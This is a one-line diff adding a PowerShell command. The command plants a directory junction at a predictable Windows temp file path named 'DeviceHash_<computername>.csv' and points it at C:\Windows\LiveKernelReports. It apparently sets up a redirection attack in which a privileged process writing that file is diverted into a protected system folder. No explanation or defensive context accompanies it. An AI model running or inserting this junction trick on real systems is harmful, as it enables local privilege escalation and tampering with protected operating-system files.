@@ -1,0 +1,1 @@
+New-Item -ItemType Junction -Path "$env:windir\Temp\DeviceHash_$env:computername.csv" -Target "C:\Windows\LiveKernelReports"
